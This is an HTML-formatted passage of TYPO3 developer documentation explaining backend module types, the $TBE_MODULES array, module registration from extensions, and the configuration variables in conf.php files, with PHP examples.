<P CLASS="western"><IMG SRC="10_html_25ac2c01.png" NAME="Graphic110" ALIGN=LEFT WIDTH=157 HEIGHT=251 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">There is a special kind of module; <B>Frameset
modules</B> are main modules in TYPO3 which provides a
navigation/list frameset for sub-modules. The &quot;Web&quot; and
&quot;File&quot; main modules are frameset modules.</P>
<H4 CLASS="western">&quot;Function Menu&quot; module</H4>
<P CLASS="western">The &quot;Function Menu&quot; is the selector box
menu you will often find in the upper right corner of backend
modules. By that selector you can select sub-functionality within
that module. Often this functionality is hardcoded into the backend
module. In other cases (like the core modules <A HREF="#Info%20module%7Coutline">Web&gt;Info</A>
and <A HREF="#Functions%20module%7Coutline">Web&gt;Functions</A>)
there is an API which allows you to add additional items to the
function menu and specify which PHP-class to call for rendering the
content of that item.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_mc202cae.png" NAME="Graphic116" ALIGN=LEFT WIDTH=523 HEIGHT=102 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The idea of Function Menu modules is that you can
add minor functionalities without introducing a whole new backend
module which shows up in the menu. Their properties are:</P>
<UL>
	<LI><P CLASS="western"><B>Discrete</B><BR>Adds functionality
	discretely or in certain contexts (like in the Web&gt;Template
	module you would add functionality related to TypoScript Templates).</P>
	<LI><P CLASS="western"><B>Simple</B><BR>Inherits access control and
	default configuration from main module.</P>
</UL>
<H4 CLASS="western">Stand-alone backend scripts</H4>
<P CLASS="western">Finally, a script can also work in the backend
without being a &quot;real&quot; module (like those in the menu) or
Function Menu module. Such a script basically needs to include the
&quot;init.php&quot; file from the TYPO3 main folder in order to
authenticate the backend users and include the standard classes of
TYPO3. Technically this is done by using a subset of the module API.
Such a stand alone script is what you will normally get if you create
a new CSM item that has to link to a backend enabled script.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m584822b0.png" NAME="Graphic117" ALIGN=LEFT WIDTH=669 HEIGHT=199 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.5.1.Backend Module API|outline"></A>Backend
Module API</H3>
<H4 CLASS="western">$TBE_MODULES</H4>
<P CLASS="western">In TYPO3 all modules are configured in the global
variable, $TBE_MODULES (see t3lib/stddb/tables.php). $TBE_MODULES
contains the structure of the backend modules as they are arranged in
main- and sub-modules. Every entry in this array represents a menu
item on either first level (array key) or second level (value from
list) in the left menu in the TYPO3 backend.</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$TBE_MODULES </FONT><FONT COLOR="#007700">= Array (</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'web' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'list,info,perm,func'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'file' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'list'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'doc' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// This should always be empty!</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#ff8000">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'user' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'tools' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'em'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'help' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'about,cshmanual'</FONT></FONT>
<FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
The syntax is:</P>
<PRE CLASS="western">$TBE_MODULES[ <I>module</I> ] =&gt; &quot;<I>submodule_1,submodule_2,submodule_3,submodule_4</I>&quot;</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western" STYLE="font-style: normal">There are two special
keys in the $TBE_MODULES array to be aware of:</P>
<UL>
	<LI><P CLASS="western"><SPAN STYLE="font-style: normal"><B>$TBE_MODULES['_PATHS']</B></SPAN><SPAN STYLE="font-style: normal">
	is an array used by extensions to register module file locations
	(for backend modules located in extensions)</SPAN>. Obviously, this
	is not representing a main module.</P>
	<LI><P CLASS="western" STYLE="font-style: normal"><B>$TBE_MODULES['doc']</B>
	is a main module which cannot have any sub modules.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">Module file locations</H4>
<P CLASS="western">Modules can be located in the file system after
three different principles:</P>
<UL>
	<LI><P CLASS="western"><B>Core modules<BR></B>The file location of
	the core modules is &quot;typo3/mod/&quot;. Here you will find a
	number of folders (main modules) and sub-folders (sub modules) with
	&quot;conf.php&quot; files and icons in. It's unlikely that new core
	modules are added since extensions should provide all future
	modules. You should never add core modules by yourself.<BR>Core
	modules are arranged in folders after the schemes
	&quot;typo3/mod/<I>[module]</I><SPAN STYLE="font-style: normal">&quot;
	and &quot;typo3/mod/</SPAN><I>[module]/[submodule]</I><SPAN STYLE="font-style: normal">&quot;.</SPAN></P>
	<LI><P CLASS="western"><B>User defined modules (OBSOLETE)</B><BR>Modules
	located in &quot;../typo3conf/&quot; directory after the same
	principles as core modules (typo3conf/<I>[module key]</I>/<I>[sub-module
	key]</I>). If a module or sub-module key in $TBE_MODULES is <I>not</I>
	found in &quot;typo3/mod/&quot; then it is looked for in
	&quot;../typo3conf/&quot;. Module/Sub-module keys of user defined
	modules should be prefixed with a lowercase &quot;u&quot;, eg.
	&quot;web_uEtest&quot; (located in &quot;typo3conf/web/uEtest/&quot;
	or &quot;uMaintest&quot; (located in
	&quot;typo3conf/uMaintest&quot;)<BR>(<I>Deprecated concept; Do not
	create user defined modules any more! Create modules in extensions
	instead.)</I></P>
	<LI><P CLASS="western"><B>Modules from extensions</B><BR><SPAN STYLE="font-style: normal">Custom
	modules supplied from extensions are located somewhere inside the
	extension file space. The extension adds the module to the system by
	an API call in the &quot;ext_tables.php&quot; file. The API call
	will add the module key to the $TBE_MODULES array and set an entry
	in $TBE_MODULES['_PATH'] pointing to the absolute path for the
	module. </SPAN>
	</P>
</UL>
<H4 CLASS="western">Parsing $TBE_MODULES</H4>
<P CLASS="western" STYLE="font-style: normal">The backend determines
if a module is a core/user or extension module by first looking for a
path-entry in $TBE_MODULES['_PATHS'] using &quot;<I>[module]_[submodule]&quot;</I>
 as key (this is also the &quot;name&quot; of the module). If an
entry is found, this location is set as the path. Otherwise
&quot;t3lib_loadmodules&quot; will look first for the module in the
core location (&quot;typo3/mod/&quot;) and if not found, then in
&quot;../typo3conf/&quot;.</P>
<P CLASS="western"><SPAN STYLE="font-style: normal">In any case, a
module is only detected if a </SPAN><SPAN STYLE="font-style: normal"><B>&quot;conf.php&quot;
file</B></SPAN><SPAN STYLE="font-style: normal"> was found in its
filepath! This file contains configuration of the module; The module
name, script, access criteria, type etc. </SPAN>
</P>
<P CLASS="western" STYLE="font-style: normal">When the backend needs
to get a list of available modules for a backend user the class
&quot;t3lib_loadmodules&quot; is used. This code snippet does the
trick:</P>
<PRE CLASS="western" STYLE="font-style: normal"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Backend Modules:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$loadModules </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#0000bb">t3lib_div</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">makeInstance</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'t3lib_loadModules'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$loadModules</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">load</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$TBE_MODULES</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">foreach(</FONT><FONT COLOR="#0000bb">$loadModules</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">modules </FONT><FONT COLOR="#007700">as </FONT><FONT COLOR="#0000bb">$mainMod </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#0000bb">$info</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;...</FONT>
<FONT COLOR="#007700">}</FONT></PRE><P CLASS="western" STYLE="font-style: normal">
The array $loadModules-&gt;modules contains information about the
modules that were accessible; their names, types, sub modules (if
any) and the filepath to their scripts (relative to PATH_typo3). 
</P>
<H4 CLASS="western">Registering new modules</H4>
<P CLASS="western">Adding new modules should be done by extensions.
The API is easy; in the &quot;ext_tables.php&quot; file of the
extension you simply need to add code like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>For main modules:</B></P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">if (</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">==</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">addModule</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'txtempM1'</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">extPath</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$_EXTKEY</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'mod1/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">}</FONT></PRE><P CLASS="western">
&quot;txtempM1&quot; is the module key of the main module created. It
could appear like this in the menu:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m10e03993.png" NAME="Graphic113" ALIGN=LEFT WIDTH=110 HEIGHT=91 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>For sub modules:</B></P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">if (</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">==</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">addModule</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'web'</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">'txtempM2'</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">extPath</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$_EXTKEY</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'mod2/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">}</FONT></PRE><P CLASS="western">
&quot;web&quot; is the name of the main module (the &quot;Web&gt;&quot;
module) and &quot;txtempM2&quot; is the sub-module key. In the menu
this module could appear like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m3559ed7.png" NAME="Graphic114" ALIGN=LEFT WIDTH=102 HEIGHT=118 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">After such two modules has been added the
$TBE_MODULES array could look like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4b19ed7f.png" NAME="Graphic115" ALIGN=LEFT WIDTH=381 HEIGHT=338 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Notice that &quot;txtempM1&quot; became a key in
the array (main modules) and &quot;txtempM2&quot; was added to the
list of modules in the &quot;Web&quot; main module (sub-modules are
listed). Also notice that the &quot;_PATHS&quot; key contains an
array of file locations of all the modules that are coming from
extensions! The last two entries in the list defines the locations of
the two modules from our example!</P>
<H3 CLASS="western"><A NAME="2.5.2.conf.php|outline"></A>conf.php</H3>
<P CLASS="western">The &quot;conf.php&quot; file is used to configure
both Backend Modules and Stand-alone scripts - but not Function Menu
modules (which are running inside a backend modules environment!).</P>
<P CLASS="western">The file contains variable and constants
definitions according to this scheme:</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=49*>
	<COL WIDTH=86*>
	<COL WIDTH=121*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=19%>
				<P CLASS="western">Variable/Constant</P>
			</TH>
			<TH WIDTH=34%>
				<P CLASS="western">Description</P>
			</TH>
			<TH WIDTH=47%>
				<P CLASS="western">Examples</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=19%>
				<P CLASS="western">TYPO3_MOD_PATH</P>
			</TD>
			<TD WIDTH=34%>
				<P CLASS="western">PHP Constant.</P>
				<P CLASS="western">Defines the path <I>from</I> the main backend
				folder (where init.php is, PATH_typo3) <I>to</I> the base folder
				of the module (where the conf.php file is).</P>
				<P CLASS="western">Used in init.php to determine the sitepath.
				Very, very important. If this is not correct, your module will
				not pass init.php without an error.</P>
			</TD>
			<TD WIDTH=47%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Configures path for a core module:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mod/web/info/'</FONT><FONT COLOR="#007700">);</FONT></FONT>

<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Configures path for an extension module:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'../typo3conf/ext/temp/mod2/'</FONT><FONT COLOR="#007700">);</FONT></FONT></PRE>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=19%>
				<P CLASS="western">$BACK_PATH</P>
			</TD>
			<TD WIDTH=34%>
				<P CLASS="western">Global Variable.</P>
				<P CLASS="western">Defines the path &quot;back&quot; to the main
				folder (PATH_typo3) from the module folder. Used by file
				references primarily. This is the reverse of &quot;TYPO3_MOD_PATH&quot;.</P>
			</TD>
			<TD WIDTH=47%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Configures backpath for a core module:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'../../../'</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Configures backpath for extension module:</FONT></FONT>
<FONT COLOR="#0000bb">$BACK_PATH </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'../../../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></PRE>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=19%>
				<P CLASS="western">$MLANG</P>
			</TD>
			<TD WIDTH=34%>
				<P CLASS="western">Global variable containing title, descriptions
				and icon reference for the backend menu.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>Applies only to Backend Modules.</I></P>
			</TD>
			<TD WIDTH=47%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;default&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;tabs_images&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;tab&quot;</FONT><FONT COLOR="#007700">] = </FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">&quot;moduleicon.gif&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;default&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;ll_ref&quot;</FONT><FONT COLOR="#007700">] = </FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">&quot;LLL:EXT:temp/mod1/locallang_mod.php&quot;</FONT><FONT COLOR="#007700">;</FONT></PRE>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=19%>
				<P CLASS="western">$MCONF</P>
			</TD>
			<TD WIDTH=34%>
				<P CLASS="western">Global variable containing settings like
				access criteria, navigation frame script, default submodule and
				the module name.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>Applies only to Backend Modules.</I></P>
			</TD>
			<TD WIDTH=47%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// For the &quot;Web&quot; main module:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'defaultMod'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'list'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'navFrameScript'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'../../alt_db_navframe.php'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'web'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'access'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'user,group'</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// More common for extension backend modules:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;access&quot;</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">&quot;user,group&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;script&quot;</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">&quot;index.php&quot;</FONT><FONT COLOR="#007700">;</FONT></PRE>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">Extensions and &quot;conf.php&quot; files</H4>
<P CLASS="western">When you create backend modules in extensions
there is a tricky thing to be aware of (exception: When using
typo3/mod.php to dispatch to a module, see later); The &quot;conf.php&quot;
file has to change depending on whether the extension is installed as
&quot;global&quot;/&quot;system&quot; extension or &quot;local&quot;.
The reason is that the TYPO3_MOD_PATH and $BACK_PATH values has to be
different when an extension is in the &quot;typo3conf/&quot; folder
which is located outside the main TYPO3 directory, PATH_typo3. For
instance TYPO3_MOD_PATH could look like &quot;../typo3conf/ext/myext/mod/&quot;
for a locally installed extensions while it would be &quot;ext/myext/mod/&quot;
for a globally installed extension!</P>
<P CLASS="western">If you install extensions via the Extension
Manager this is no problem since the Extension Manager (EM) corrects
it before writing the &quot;conf.php&quot; file to the servers
file-system. But you need to make your &quot;conf.php&quot; file
compatible with this behaviour. Basically that includes:</P>
<UL>
	<LI><P CLASS="western">Insert the two lines with
	&quot;defined('TYPO3_MOD_PATH'......&quot; and &quot;$BACK_PATH =
	.....&quot; as the first ones and do not prefix or suffix them with
	anything; then the EM should be able to detect them.</P>
	<LI><P CLASS="western">In the &quot;ext_emconf.php&quot; file of the
	extension you need to add the directory of the module to the list of
	backend modules configured in the key
	$EM_CONF[<I>extension-key</I>][&quot;module&quot;] - otherwise the
	EM will not know that there is a &quot;conf.php&quot; file to
	modify!</P>
</UL>
<P CLASS="western">An example would look like this:</P>
<PRE CLASS="western"><FONT COLOR="#0000bb">&lt;?php</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// DO NOT REMOVE OR CHANGE THESE 3 LINES:</FONT></FONT>
<FONT COLOR="#000000"><B><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'../typo3conf/ext/temp/mod2/'</FONT><FONT COLOR="#007700">);</FONT></B></FONT>
<FONT COLOR="#000000"><B><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">=</FONT><FONT COLOR="#dd0000">'../../../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></B></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;name&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;web_txtempM2&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;access&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;user,group&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;script&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;index.php&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;default&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;tabs_images&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;tab&quot;</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">&quot;moduleicon.gif&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;default&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;ll_ref&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;LLL:EXT:temp/mod2/locallang_mod.php&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#0000bb">?&gt;</FONT></PRE><P CLASS="western">
<BR><BR>
</P>
<H4 CLASS="western">$MLANG</H4>
<P CLASS="western"><BR><BR>
</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=113*>
	<COL WIDTH=143*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=44%>
				<P CLASS="western">$MLANG keys</P>
			</TH>
			<TH WIDTH=56%>
				<P CLASS="western">Description</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=44%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tabs_images'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tab'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Icon reference</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=44%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'ll_ref'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">&quot;locallang&quot; file reference where the
				keys &quot;mlang_tabs_tab&quot;, &quot;mlang_labels_tablabel&quot;
				and &quot;mlang_labels_tabdescr&quot; defines titles and
				description text for the module.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=44%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[ </FONT><FONT COLOR="#dd0000"><I>language-key </I></FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'labels'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tablabel'</FONT><FONT COLOR="#007700">]<BR></FONT><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[ </FONT><FONT COLOR="#dd0000"><I>language-key </I></FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'labels'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tabdescr'</FONT><FONT COLOR="#007700">]<BR></FONT><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[ </FONT><FONT COLOR="#dd0000"><I>language-key </I></FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tabs'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tab'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Obsolete</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The $MLANG variable contains the icon reference
and title / description for a Backend Module. Originally the $MLANG
variable defined values for all languages inside the conf.php file.
This (obsolete) codelisting shows it:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western">$MLANG[&quot;default&quot;][&quot;labels&quot;][&quot;tablabel&quot;] = &quot;Advanced functions&quot;;
